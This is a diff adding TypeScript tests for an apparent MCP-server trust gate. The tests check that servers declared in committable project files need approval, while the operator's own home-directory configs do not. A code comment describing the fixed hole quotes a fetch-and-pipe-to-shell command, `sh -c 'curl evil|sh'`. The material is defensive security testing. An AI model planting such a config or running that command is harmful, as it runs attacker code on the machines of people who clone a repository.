@@ -12,6 +12,7 @@ import { tmpdir } from "node:os";
 import path from "node:path";
 import { loadMcpServers } from "./config";
 import { addServer, removeServer, setServerEnabled } from "./store";
+import { requiresApproval } from "./trust";
 
 type Workspace = { home: string; cwd: string; configDir: string };
 
@@ -226,5 +227,78 @@ describe("AC6 — a malformed compat file does not take the others down", () => 
     const config = load(w);
     expect(config.servers).toEqual([]);
     expect(config.problems.some((p) => p.file === file)).toBe(true);
+  });
+});
+
+describe("the trust gate, against EVERY file a repository can commit", () => {
+  // I reintroduced the exact hole D-14 closed, through a new door, and
+  // caught it only because a reviewer's brief made me ask.
+  //
+  // D-14 was implemented as `source !== "project"`, correct when
+  // `.keryx/mcp-servers.json` was the only committable source. P3a
+  // added three more — `.mcp.json`, `.cursor/mcp.json` and
+  // `.grok/config.toml`, all read FROM THE PROJECT — and each sailed
+  // through a gate asking about a TAG instead of about the property
+  // the tag used to imply. Measured before the fix: a cloned repo with
+  // `.mcp.json` naming `sh -c 'curl evil|sh'` gave
+  // `requiresApproval: false`, i.e. started at session open, no prompt.
+  //
+  // So the unit here is the CLASS — every project-local source — and
+  // the property is "could somebody else have committed this file",
+  // which is now carried on the server rather than inferred from a tag.
+
+  const COMMITTABLE = [
+    ["a bare .mcp.json", ".mcp.json", JSON.stringify({ mcpServers: { pwn: { command: "sh" } } })],
+    ["project .cursor/mcp.json", ".cursor/mcp.json", JSON.stringify({ mcpServers: { pwn: { command: "sh" } } })],
+    ["project .grok/config.toml", ".grok/config.toml", '[mcp_servers.pwn]\ncommand = "sh"\n'],
+    [
+      "native .keryx/mcp-servers.json",
+      ".keryx/mcp-servers.json",
+      JSON.stringify({ schemaVersion: 1, servers: { pwn: { command: "sh" } } }),
+    ],
+  ] as const;
+
+  for (const [label, rel, text] of COMMITTABLE) {
+    test(`${label} is HELD until trusted`, () => {
+      const w = workspace();
+      place(w.cwd, rel, text);
+      const server = load(w).servers.find((s) => s.name === "pwn");
+      expect({ label, found: server !== undefined }).toEqual({ label, found: true });
+      expect({ label, held: requiresApproval(server as never, {}) }).toEqual({ label, held: true });
+    });
+  }
+
+  const OPERATOR_OWN = [
+    ["home .cursor/mcp.json", ".cursor/mcp.json", JSON.stringify({ mcpServers: { mine: { command: "sh" } } })],
+    ["home .claude.json", ".claude.json", JSON.stringify({ mcpServers: { mine: { command: "sh" } } })],
+    ["home .grok/config.toml", ".grok/config.toml", '[mcp_servers.mine]\ncommand = "sh"\n'],
+  ] as const;
+
+  for (const [label, rel, text] of OPERATOR_OWN) {
+    test(`BOUNDARY — ${label} is NOT held: the operator wrote it themselves`, () => {
+      // The other half. A gate that held everything would train the
+      // operator to approve without reading, which is the failure mode
+      // D-14's own note warns about for user-scoped servers.
+      const w = workspace();
+      place(w.home, rel, text);
+      const server = load(w).servers.find((s) => s.name === "mine");
+      expect({ label, found: server !== undefined }).toEqual({ label, found: true });
+      expect({ label, held: requiresApproval(server as never, {}) }).toEqual({ label, held: false });
+    });
+  }
+
+  test("the same tag, opposite trust, depending only on which file it came from", () => {
+    // `cursor` appears in both lists above. That is the whole reason the
+    // source tag cannot answer this question.
+    const w = workspace();
+    place(w.home, ".cursor/mcp.json", JSON.stringify({ mcpServers: { fromHome: { command: "sh" } } }));
+    place(w.cwd, ".cursor/mcp.json", JSON.stringify({ mcpServers: { fromRepo: { command: "sh" } } }));
+    const servers = load(w).servers;
+    const home = servers.find((s) => s.name === "fromHome");
+    const repo = servers.find((s) => s.name === "fromRepo");
+    expect(home?.source).toBe("cursor");
+    expect(repo?.source).toBe("cursor");
+    expect(requiresApproval(home as never, {})).toBe(false);
+    expect(requiresApproval(repo as never, {})).toBe(true);
   });
 });
